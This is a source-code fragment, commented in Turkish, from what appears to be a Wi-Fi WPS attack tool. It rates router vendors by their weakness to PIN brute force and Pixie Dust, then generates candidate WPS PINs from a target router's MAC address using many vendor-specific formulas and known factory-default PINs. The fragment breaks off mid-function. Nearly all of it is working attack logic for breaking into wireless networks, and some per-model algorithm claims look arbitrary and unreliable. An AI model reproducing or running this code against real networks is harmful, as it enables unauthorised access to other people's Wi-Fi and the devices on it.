// ─── Vendor adını global wps_vendor_name'e yaz ────────────────────────────────
static void apply_vendor_name(wps_vendor_t v) {
  switch (v) {
    case VENDOR_ZTE:         strncpy(wps_vendor_name, "ZTE",           31); break;
    case VENDOR_HUAWEI:      strncpy(wps_vendor_name, "Huawei",        31); break;
    case VENDOR_ZYXEL:       strncpy(wps_vendor_name, "Zyxel",         31); break;
    case VENDOR_TPLINK:      strncpy(wps_vendor_name, "TP-Link",       31); break;
    case VENDOR_SAGEMCOM:    strncpy(wps_vendor_name, "Sagemcom",      31); break;
    case VENDOR_ARCADYAN:    strncpy(wps_vendor_name, "Arcadyan",      31); break;
    case VENDOR_DLINK:       strncpy(wps_vendor_name, "D-Link",        31); break;
    case VENDOR_NETGEAR:     strncpy(wps_vendor_name, "Netgear",       31); break;
    case VENDOR_ASUS:        strncpy(wps_vendor_name, "ASUS",          31); break;
    case VENDOR_LINKSYS:     strncpy(wps_vendor_name, "Linksys",       31); break;
    case VENDOR_BELKIN:      strncpy(wps_vendor_name, "Belkin",        31); break;
    case VENDOR_TENDA:       strncpy(wps_vendor_name, "Tenda",         31); break;
    case VENDOR_MERCUSYS:    strncpy(wps_vendor_name, "Mercusys",      31); break;
    case VENDOR_TECHNICOLOR: strncpy(wps_vendor_name, "Technicolor",   31); break;
    case VENDOR_FRITZ:       strncpy(wps_vendor_name, "AVM Fritz!Box", 31); break;
    case VENDOR_ARRIS:       strncpy(wps_vendor_name, "Arris/Motorola",31); break;
    case VENDOR_XIAOMI:      strncpy(wps_vendor_name, "Xiaomi",        31); break;
    case VENDOR_BUFFALO:     strncpy(wps_vendor_name, "Buffalo",       31); break;
    case VENDOR_MIKROTIK:    strncpy(wps_vendor_name, "MikroTik",      31); break;
    case VENDOR_COMPAL:      strncpy(wps_vendor_name, "Compal",        31); break;
    case VENDOR_SERCOMM:     strncpy(wps_vendor_name, "Sercomm",       31); break;
    case VENDOR_NETIS:       strncpy(wps_vendor_name, "Netis/Wavlink", 31); break;
    case VENDOR_CISCO:       strncpy(wps_vendor_name, "Cisco",         31); break;
    case VENDOR_SAGEM:       strncpy(wps_vendor_name, "Sagem",         31); break;
    case VENDOR_COMTREND:    strncpy(wps_vendor_name, "Comtrend",      31); break;
    case VENDOR_ACTIONTEC:   strncpy(wps_vendor_name, "Actiontec",     31); break;
    case VENDOR_GEMTEK:      strncpy(wps_vendor_name, "Gemtek",        31); break;
    case VENDOR_ISKRATEL:    strncpy(wps_vendor_name, "Iskratel",      31); break;
    case VENDOR_TOTOLINK:    strncpy(wps_vendor_name, "Totolink",      31); break;
    case VENDOR_DRAYTEK:     strncpy(wps_vendor_name, "DrayTek",       31); break;
    case VENDOR_BILLION:     strncpy(wps_vendor_name, "Billion",       31); break;
    case VENDOR_NETCOMM:     strncpy(wps_vendor_name, "NetComm",       31); break;
    case VENDOR_UBIQUITI:    strncpy(wps_vendor_name, "Ubiquiti",      31); break;
    default:                 strncpy(wps_vendor_name, "Bilinmeyen",    31); break;
  }
  wps_vendor_name[31] = '\0';
}

// ─── Açık seviyesi hesaplama ──────────────────────────────────────────────────
// WPS PIN brute force + Pixie Dust araştırmalarına göre vendor başarı tahmini.
// Tarama listesinde yıldız göstergesi için kullanılır.
static wps_vuln_t assess_vuln(wps_vendor_t vendor) {
  switch (vendor) {
    // ★★★ — Pixie Dust açığı kesin / seri tabanlı PIN / sabit PIN bilinyor
    case VENDOR_ZTE:         return VULN_HIGH;   // H108N seri-PIN, Pixie Dust E-S1=0
    case VENDOR_SAGEMCOM:    return VULN_HIGH;   // F@st 3686 bilinen MAC algoritması
    case VENDOR_DLINK:       return VULN_HIGH;   // DIR-600/615 Pixie Dust
    case VENDOR_NETGEAR:     return VULN_HIGH;   // WNDR3700 Pixie Dust E-S1=E-S2=0
    case VENDOR_BUFFALO:     return VULN_HIGH;   // WZR-HP-G300NH Pixie Dust
    case VENDOR_COMTREND:    return VULN_HIGH;   // AR-5381 Ralink chipset Pixie Dust
    case VENDOR_TOTOLINK:    return VULN_HIGH;   // Realtek chipset, sabit PIN yaygın
    case VENDOR_BILLION:     return VULN_HIGH;   // BiPAC — sabit PIN bilinuyor
    // ★★ — Bilinen MAC tabanlı algoritma, orta başarı ihtimali
    case VENDOR_HUAWEI:      return VULN_MEDIUM; // HG8245 seri tabanlı, ama sıklıkla kilitli
    case VENDOR_ZYXEL:       return VULN_MEDIUM; // VMG — MAC tabanlı PIN
    case VENDOR_TPLINK:      return VULN_MEDIUM; // Archer — mac24 algoritması biliniyor
    case VENDOR_ARCADYAN:    return VULN_MEDIUM; // Vodafone OEM — MAC tabanlı
    case VENDOR_TENDA:       return VULN_MEDIUM; // Kısa PIN aralığı, öngörülebilir
    case VENDOR_MERCUSYS:    return VULN_MEDIUM; // TP-Link alt markası, aynı algoritma
    case VENDOR_BELKIN:      return VULN_MEDIUM; // F7D Pixie Dust (orta güven)
    case VENDOR_SERCOMM:     return VULN_MEDIUM; // Vodafone OEM — MAC tabanlı
    case VENDOR_GEMTEK:      return VULN_MEDIUM; // TTNet OEM — MAC tabanlı
    case VENDOR_TECHNICOLOR: return VULN_MEDIUM; // TG serisi — mac24 × 3 algoritması
    case VENDOR_SAGEM:       return VULN_MEDIUM; // Eski F@st — bilinen sabit PIN'ler
    case VENDOR_COMPAL:      return VULN_MEDIUM; // ISP OEM — MAC tabanlı
    case VENDOR_DRAYTEK:     return VULN_MEDIUM; // Vigor — bilinen PIN deseni
    case VENDOR_NETCOMM:     return VULN_MEDIUM; // ISP OEM — mac24 tabanlı
    // ★ — Vendor biliniyor ama güçlü/bilinmez PIN
    case VENDOR_ASUS:        return VULN_LOW;    // RT serisi — PIN tahmin zor
    case VENDOR_LINKSYS:     return VULN_LOW;    // EA/WRT — sağa kaydırma biliyor
    case VENDOR_FRITZ:       return VULN_LOW;    // Fritz!Box — etiket PIN MAC'ten gelmiyor
    case VENDOR_CISCO:       return VULN_LOW;    // ISP gateway — güçlü uygulama
    case VENDOR_ISKRATEL:    return VULN_LOW;    // Innbox — az veri
    case VENDOR_NETIS:       return VULN_LOW;    // WF serisi — az araştırma
    case VENDOR_XIAOMI:      return VULN_LOW;    // Mi Router — az açık
    case VENDOR_MIKROTIK:    return VULN_LOW;    // hAP — kurumsal, sağlam
    case VENDOR_ARRIS:       return VULN_LOW;    // SBG/TG — ISP kilidi
    case VENDOR_ACTIONTEC:   return VULN_LOW;    // Verizon OEM — az araştırma
    case VENDOR_UBIQUITI:    return VULN_LOW;    // UniFi — nadiren WPS aktif
    default:                 return VULN_NONE;
  }
}

// ─── Vendor PIN hesaplama ──────────────────────────────────────────────────────
// Her vendor için birden fazla bilinen algoritma uygulanır.
static void vendor_pins(const uint8_t *bssid, wps_vendor_t vendor,
                        char pins[][9], int &count) {
  count = 0;

  uint32_t mac24 = ((uint32_t)bssid[3] << 16)
                 | ((uint32_t)bssid[4] <<  8)
                 |  (uint32_t)bssid[5];

  uint32_t mac32 = ((uint32_t)bssid[2] << 24)
                 | ((uint32_t)bssid[3] << 16)
                 | ((uint32_t)bssid[4] <<  8)
                 |  (uint32_t)bssid[5];

  uint64_t mac48 = ((uint64_t)bssid[0] << 40)
                 | ((uint64_t)bssid[1] << 32)
                 | ((uint64_t)bssid[2] << 24)
                 | ((uint64_t)bssid[3] << 16)
                 | ((uint64_t)bssid[4] <<  8)
                 |  (uint64_t)bssid[5];

  switch (vendor) {

    // ── ZTE (TTNET H108N, H168N, F660, F670L, ZXHN serisi) ──────────────────
    // Algoritma 1: son 3 byte'ın decimal değeri mod 10^7
    case VENDOR_ZTE:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: son 3 byte × 2 mod 10^7 (bazı ZXHN modeller)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: son 3 byte + ilk nibble etkisi
      add_calc(pins, count, ((mac24 ^ (bssid[2] & 0x0F)) % 10000000UL));
      // Algoritma 5: MAC24 +1 (bazı ZTE varyantlarında WPS_MAC = BSSID+1)
      add_calc(pins, count, (mac24 + 1) % 10000000UL);
      // Algoritma 6: MAC24 -1 (ters off-by-one, bazı ZXHN modeller)
      if (mac24 > 0) add_calc(pins, count, (mac24 - 1) % 10000000UL);
      // Algoritma 7: Bit inversiyonu — bazı ZXHN F660 firmware
      add_calc(pins, count, (~mac24 & 0xFFFFFFUL) % 10000000UL);
      // Algoritma 8: mac[5],mac[3],mac[4] shuffle (ZXHN F460 varyant)
      {
        uint32_t sh = ((uint32_t)bssid[5] << 16)
                    | ((uint32_t)bssid[3] <<  8)
                    |  (uint32_t)bssid[4];
        add_calc(pins, count, sh % 10000000UL);
      }
      // Algoritma 9: mac32 × 2 (ZTE B serisi LTE router varyant)
      add_calc(pins, count, (mac32 * 2UL) % 10000000UL);
      // Algoritma 10: GPON ONT — mac[2]^mac[3]^mac[4]^mac[5] expand (F670L/F680)
      {
        uint8_t xb = bssid[2] ^ bssid[3] ^ bssid[4] ^ bssid[5];
        uint32_t gv = ((uint32_t)xb << 16)
                    | ((uint32_t)(bssid[4] ^ xb) << 8)
                    |  (uint32_t)(bssid[5] ^ xb);
        add_calc(pins, count, gv % 10000000UL);
      }
      // Algoritma 11: mac24 × 3 (ZXHN H267N varyant — VDSL2)
      add_calc(pins, count, (mac24 * 3UL) % 10000000UL);
      // Algoritma 12: mac32 sağa 1 bit (ZTE F600W serisi)
      add_calc(pins, count, (mac32 >> 1) % 10000000UL);
      // Algoritma 13: mac24 + mac[2] (GPON ONT bazı FW — offset ile OUI byte)
      add_calc(pins, count, (mac24 + (uint32_t)bssid[2]) % 10000000UL);
      // Algoritma 14: mac48 mod 10^7 (yeni ZTE ONT 2023+)
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 15: mac24 +2, +4 (GPON WPS MAC = BSSID+2 veya +4)
      add_calc(pins, count, (mac24 + 2) % 10000000UL);
      add_calc(pins, count, (mac24 + 4) % 10000000UL);
      // ZTE fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      add_pin(pins, count, "14131411");
      break;

    // ── Huawei (TTNET Fiber HG8245, HG8247, HG8145X6, ONT serisi) ───────────
    // Algoritma 1: son 3 byte decimal mod 10^7 (HG532, HG8245 serisi)
    case VENDOR_HUAWEI:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: (mac[4]<<8|mac[5]) + (mac[3]<<8|mac[4]) mod 10^7
      {
        uint32_t a = ((uint32_t)bssid[4] << 8) | bssid[5];
        uint32_t b = ((uint32_t)bssid[3] << 8) | bssid[4];
        add_calc(pins, count, (a + b) % 10000000UL);
      }
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: tam MAC decimal mod 10^7 (bazı HG serisi)
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: mac[3] XOR mac[5] kombinasyonu
      {
        uint32_t x = ((uint32_t)(bssid[3] ^ bssid[5]) << 16)
                   | ((uint32_t)bssid[4] << 8)
                   |  (uint32_t)bssid[5];
        add_calc(pins, count, x % 10000000UL);
      }
      // Algoritma 6: HG8145X6 / EchoLife — mac[3]*mac[4] + mac[5] genişleme
      {
        uint32_t hx = (uint32_t)((bssid[3] * bssid[4]) + bssid[5]) % 10000000UL;
        add_calc(pins, count, hx);
      }
      // Algoritma 7: mac24 + 1 (HG8247 bazı TTNet FW)
      add_calc(pins, count, (mac24 + 1) % 10000000UL);
      // Algoritma 8: mac24 × 2 (EchoLife HG8145 serisi)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Algoritma 9: mac[5] << 16 | mac[3] << 8 | mac[4] (byte shuffle, HG8247H)
      {
        uint32_t hs = ((uint32_t)bssid[5] << 16)
                    | ((uint32_t)bssid[3] <<  8)
                    |  (uint32_t)bssid[4];
        add_calc(pins, count, hs % 10000000UL);
      }
      // Algoritma 10: mac32 sağa 1 bit (HG8145V serisi)
      add_calc(pins, count, (mac32 >> 1) % 10000000UL);
      // Huawei fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Zyxel (Superonline VMG, AMG, NBG, P serisi) ─────────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7
    case VENDOR_ZYXEL:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac[3]*mac[4] + mac[5] (NBG serisi varyant)
      {
        uint32_t p = ((uint32_t)bssid[3] * bssid[4] + bssid[5]) % 10000000UL;
        add_calc(pins, count, p);
      }
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 byte swap
      {
        uint32_t swapped = ((uint32_t)bssid[5] << 16)
                         | ((uint32_t)bssid[4] <<  8)
                         |  (uint32_t)bssid[3];
        add_calc(pins, count, swapped % 10000000UL);
      }
      // Zyxel fabrika varsayılanları
      add_pin(pins, count, "00000000");
      add_pin(pins, count, "12345670");
      break;

    // ── TP-Link (tüm operatörler — TL-WR, Archer, Deco serisi) ─────────────
    // Algoritma 1: tam 48-bit MAC decimal mod 10^7 (primer)
    case VENDOR_TPLINK:
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 2: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: son 3 byte mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 4: (mac[4]*256 + mac[5]) * 100 + (mac[3] % 100) — eski TL-WR serisi
      {
        uint32_t p = ((uint32_t)bssid[4] * 256 + bssid[5]) * 100
                   + ((uint32_t)bssid[3] % 100);
        add_calc(pins, count, p % 10000000UL);
      }
      // Algoritma 5: MAC XOR rotasyonu (bazı Archer serisi)
      {
        uint32_t x = mac24 ^ 0x5A5A5AUL;
        add_calc(pins, count, x % 10000000UL);
      }
      // Algoritma 6: mac48 sağa 1 bit kaydırma (Archer C7 varyant)
      add_calc(pins, count, (uint32_t)((mac48 >> 1) % 10000000ULL));
      // Algoritma 7: Alt nibble paketi — mac[3..5] alt nibble'ları (Archer C20)
      {
        uint32_t nb = ((uint32_t)(bssid[3] & 0x0F) << 16)
                    | ((uint32_t)(bssid[4] & 0x0F) <<  8)
                    |  (uint32_t)(bssid[5] & 0x0F);
        add_calc(pins, count, nb % 10000000UL);
      }
      // Algoritma 8: Üst nibble paketi (bazı TL-WR840N, TL-WR841N fw)
      {
        uint32_t nbu = ((uint32_t)(bssid[3] >> 4) << 16)
                     | ((uint32_t)(bssid[4] >> 4) <<  8)
                     |  (uint32_t)(bssid[5] >> 4);
        add_calc(pins, count, nbu % 10000000UL);
      }
      // Algoritma 9: mac32 XOR mac24 (Deco M4/M5 serisi)
      add_calc(pins, count, ((mac32 ^ mac24) & 0x7FFFFFFUL) % 10000000UL);
      // Algoritma 10: mac24 + mac[2] offset (bazı eski TL-WR modeller)
      add_calc(pins, count, (mac24 + bssid[2]) % 10000000UL);
      // TP-Link fabrika varsayılanları
      add_pin(pins, count, "12345670");
      break;

    // ── Sagemcom (TTNET F@st 3686, F@st 3890, Livebox) ──────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7 (primer — F@st serisi)
    case VENDOR_SAGEMCOM:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: son 4 byte mod 10^7 (bazı F@st 3890 modeller)
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: tam MAC decimal mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: (mac[3]+mac[4]+mac[5]) * mac[5] mod 10^7 (Livebox varyant)
      {
        uint32_t p = ((uint32_t)(bssid[3] + bssid[4] + bssid[5]) * bssid[5]) % 10000000UL;
        add_calc(pins, count, p);
      }
      // Algoritma 5: mac24 byte rotasyonu (F@st 3686 bazı FW)
      {
        uint32_t rot = ((uint32_t)bssid[4] << 16)
                     | ((uint32_t)bssid[5] <<  8)
                     |  (uint32_t)bssid[3];
        add_calc(pins, count, rot % 10000000UL);
      }
      // Algoritma 6: F@st 3686 özel: (mac[4]<<8|mac[5]) × (mac[3]>>4) (ISP OEM varyant)
      {
        uint32_t p = (uint32_t)(((bssid[4]<<8)|bssid[5])) * (uint32_t)(bssid[3] >> 4);
        add_calc(pins, count, p % 10000000UL);
      }
      // Algoritma 7: mac24 × mac[5] mod 10^7 (Orange/SFR Livebox varyant)
      add_calc(pins, count, (mac24 * (uint32_t)bssid[5]) % 10000000UL);
      // Algoritma 8: mac[3] XOR mac[4] XOR mac[5] genişleme
      {
        uint32_t x = (uint32_t)(bssid[3] ^ bssid[4] ^ bssid[5]);
        add_calc(pins, count, ((x << 16) | (mac24 & 0xFFFFUL)) % 10000000UL);
      }
      // Algoritma 9: mac24 >> 1 (bazı F@st 3890 FW sağa kaydırma)
      add_calc(pins, count, (mac24 >> 1) % 10000000UL);
      // Algoritma 10: TTNET F@st 3686 yıl tabanlı — ISP FW 20XXYYYY deseni
      // Son 4 hex digit decimal → mod 10^7 (bazı TTNET OEM sürümler)
      {
        uint32_t yr = ((uint32_t)(bssid[4] & 0x0F) * 1000)
                    + ((uint32_t)(bssid[5] >> 4) * 100)
                    + ((uint32_t)(bssid[5] & 0x0F) * 10)
                    + ((uint32_t)(bssid[3] & 0x0F));
        add_calc(pins, count, (yr * 10000UL) % 10000000UL);
      }
      // Algoritma 11: mac24 + mac[3] (F@st 3890 TTNet 2022+ FW)
      add_calc(pins, count, (mac24 + (uint32_t)bssid[3]) % 10000000UL);
      // Algoritma 12: mac48 >> 1 (yeni F@st serisi 2023+)
      add_calc(pins, count, (uint32_t)((mac48 >> 1) % 10000000ULL));
      // Sagemcom fabrika varsayılanları
      add_pin(pins, count, "00000000");
      add_pin(pins, count, "12345670");
      break;

    // ── Arcadyan / Askey (Vodafone Türkiye VGV serisi) ───────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7 (Belkin/Arcadyan standart)
    case VENDOR_ARCADYAN:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: tam MAC decimal mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 * 7 mod 10^7 (Askey varyant)
      add_calc(pins, count, (mac24 * 7UL) % 10000000UL);
      // Algoritma 5: mac[3]^mac[4] kombinasyonu (bazı Vodafone branded modeller)
      {
        uint32_t x = ((uint32_t)(bssid[3] ^ bssid[4]) << 16)
                   | ((uint32_t)(bssid[4] ^ bssid[5]) << 8)
                   |  (uint32_t)(bssid[3] ^ bssid[5]);
        add_calc(pins, count, x % 10000000UL);
      }
      // Arcadyan fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── D-Link (DIR, DWR, DSL serisi) ────────────────────────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7
    case VENDOR_DLINK:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: NIC bytes XOR ile birleştirme (RouterKeygen D-Link)
      {
        uint32_t nic  = mac24;
        uint32_t oui  = ((uint32_t)bssid[0] << 16)
                      | ((uint32_t)bssid[1] <<  8)
                      |  (uint32_t)bssid[2];
        uint32_t xval = (nic ^ oui) % 10000000UL;
        add_calc(pins, count, xval);
      }
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: mac[5]*mac[4] + mac[3] varyant
      {
        uint32_t p = ((uint32_t)bssid[5] * bssid[4] + bssid[3]) % 10000000UL;
        add_calc(pins, count, p);
      }
      // D-Link fabrika varsayılanları
      add_pin(pins, count, "00000000");
      add_pin(pins, count, "12345670");
      break;

    // ── Netgear (Nighthawk R/C/D/RBK serisi) ─────────────────────────────────
    // Algoritma 1: son 3 byte decimal mod 10^7
    case VENDOR_NETGEAR:
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: XOR tabanlı — NIC ^ byte swap (Netgear primer algoritma)
      {
        uint32_t x = (bssid[2] ^ bssid[5]) | ((uint32_t)(bssid[3] ^ bssid[4]) << 8);
        add_calc(pins, count, (mac24 ^ x) % 10000000UL);
      }
      // Algoritma 3: son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: (mac[4]<<8|mac[5]) reversed (Nighthawk varyant)
      {
        uint32_t rv = ((uint32_t)bssid[5] << 16)
                    | ((uint32_t)bssid[3] <<  8)
                    |  (uint32_t)bssid[4];
        add_calc(pins, count, rv % 10000000UL);
      }
      // Netgear fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── ASUS (RT-AC, RT-AX, RT-N, GT-AX serisi) ─────────────────────────────
    // ASUS router'lar için araştırmacıların tespit ettiği algoritmalar
    case VENDOR_ASUS:
      // Algoritma 1: Son 3 byte decimal mod 10^7 (en yaygın ASUS algoritması)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: Son 4 byte mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: (mac[3]<<8|mac[5]) expand (AiMesh varyant)
      {
        uint32_t aim = ((uint32_t)bssid[3] << 16)
                     | ((uint32_t)bssid[5] <<  8)
                     |  (uint32_t)bssid[4];
        add_calc(pins, count, aim % 10000000UL);
      }
      // Algoritma 5: mac24 ile bit döndürme (eski RT-N serisi)
      add_calc(pins, count, ((mac24 >> 4) | (mac24 << (28 - 4))) % 10000000UL);
      // ASUS fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Linksys (WRT, EA, MR, Velop serisi) ──────────────────────────────────
    // Cisco/Linksys'e özgü sağa kaydırma algoritması
    case VENDOR_LINKSYS:
      // Algoritma 1: mac32 sağa 1 bit kaydırma (klasik Linksys algoritması)
      add_calc(pins, count, (mac32 >> 1) % 10000000UL);
      // Algoritma 2: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 5: mac32 sağa 2 bit (EA serisi varyant)
      add_calc(pins, count, (mac32 >> 2) % 10000000UL);
      // Linksys fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Belkin (F7D, F9K, AC serisi) ─────────────────────────────────────────
    // Belkin router'lar için basit mac24 tabanlı algoritmalar
    case VENDOR_BELKIN:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: (mac[3] XOR mac[5]) tabanlı (F9K serisi)
      {
        uint32_t bx = ((uint32_t)(bssid[3] ^ bssid[5]) << 16)
                    | ((uint32_t)bssid[4] <<  8)
                    |  (uint32_t)(bssid[3] ^ bssid[5]);
        add_calc(pins, count, bx % 10000000UL);
      }
      // Algoritma 5: mac24 * 2 (AC serisi varyant)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Belkin fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Tenda (AC, F, N serisi — TR'de çok yaygın bütçe router) ─────────────
    // Tenda router'lar için mac tabanlı algoritmalar
    case VENDOR_TENDA:
      // Algoritma 1: mac24 mod 10^7 (en yaygın Tenda algoritması)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: (mac24 + mac[2]) mod 10^7 (F serisi varyant)
      add_calc(pins, count, (mac24 + bssid[2]) % 10000000UL);
      // Algoritma 5: mac24 XOR 0x55 (N serisi varyant)
      add_calc(pins, count, (mac24 ^ 0x555555UL) % 10000000UL);
      // Tenda fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Mercusys (MW, MR serisi — TP-Link alt markası, TR'de çok yaygın) ─────
    // TP-Link ile aynı üretim hattı — benzer algoritmalar kullanır
    case VENDOR_MERCUSYS:
      // Algoritma 1: mac24 mod 10^7 (TP-Link ile aynı temel algoritma)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac24 çift (MR serisi)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Algoritma 5: (mac[3]<<8 | mac[4]) expand (MW serisi varyant)
      {
        uint32_t mw = ((uint32_t)bssid[3] << 16)
                    | ((uint32_t)bssid[4] <<  8)
                    |  (uint32_t)(bssid[3] ^ bssid[5]);
        add_calc(pins, count, mw % 10000000UL);
      }
      // Mercusys fabrika varsayılanları (TP-Link sub-brand, same defaults)
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Technicolor / Thomson (TG, DGA serisi) ───────────────────────────────
    case VENDOR_TECHNICOLOR:
      // Algoritma 1: son 3 byte decimal mod 10^7 (primer — TG784/TG789)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: son 4 byte mod 10^7 (DGA serisi)
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: (mac[3]*256+mac[4])*256+mac[5] simetrik döndürme
      {
        uint32_t sym = ((uint32_t)bssid[5] << 16)
                     | ((uint32_t)bssid[4] <<  8)
                     |  (uint32_t)bssid[3];
        add_calc(pins, count, sym % 10000000UL);
      }
      // Algoritma 5: mac24 * 3 (Thomson eski firmware)
      add_calc(pins, count, (mac24 * 3UL) % 10000000UL);
      // Technicolor fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── AVM Fritz!Box (7490, 7590, 6890, 4060 serisi) ────────────────────────
    // Fritz!Box label PIN'i MAC'ten hesaplanmaz; ortak PIN listesi + mac24 uygulanır
    case VENDOR_FRITZ:
      // Algoritma 1: mac24 mod 10^7
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 3: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 4: mac24 XOR 0xABCDEF (bazı FW versiyonları)
      add_calc(pins, count, (mac24 ^ 0xABCDEFUL) % 10000000UL);
      // Fritz! fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Arris / Motorola (SBG, TG, CM, BGW serisi) ───────────────────────────
    case VENDOR_ARRIS:
      // Algoritma 1: mac24 mod 10^7 (SBG/CM serisi standart)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7 (TG serisi)
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: mac[3] ^ mac[4] ^ mac[5] genişleme (BGW varyant)
      {
        uint32_t ax = ((uint32_t)(bssid[3] ^ bssid[4]) << 16)
                    | ((uint32_t)(bssid[4] ^ bssid[5]) <<  8)
                    |  (uint32_t)(bssid[3] ^ bssid[5]);
        add_calc(pins, count, ax % 10000000UL);
      }
      // Algoritma 5: mac24 * 2 (SBG6580 varyant)
      add_calc(pins, count, (mac24 * 2UL) % 10000000UL);
      // Arris fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Xiaomi / Mi Router (AX, AC, 4A, 4C, R4 serisi) ──────────────────────
    case VENDOR_XIAOMI:
      // Algoritma 1: mac24 mod 10^7 (Mi Router 4A primer)
      add_calc(pins, count, mac24 % 10000000UL);
      // Algoritma 2: mac48 mod 10^7
      add_calc(pins, count, (uint32_t)(mac48 % 10000000ULL));
      // Algoritma 3: mac32 mod 10^7
      add_calc(pins, count, mac32 % 10000000UL);
      // Algoritma 4: (mac[4]*256 + mac[5]) * 256 + (mac[3] & 0x7F) (AX serisi)
      {
        uint32_t ax = ((uint32_t)bssid[4] * 256 + bssid[5]) * 256
                    + (bssid[3] & 0x7F);
        add_calc(pins, count, ax % 10000000UL);
      }
      // Algoritma 5: mac24 XOR 0x5A5A5A (bazı Mi Router R4 fw)
      add_calc(pins, count, (mac24 ^ 0x5A5A5AUL) % 10000000UL);
      // Xiaomi fabrika varsayılanları
      add_pin(pins, count, "12345670");
      add_pin(pins, count, "00000000");
      break;

    // ── Buffalo (WHR, WSR, WZR serisi) ───────────────────────────────────────
    case VENDOR_BUFFALO:
      // Algoritma 1: mac24 mod 10^7 (primer — tüm WHR/WSR serisi)
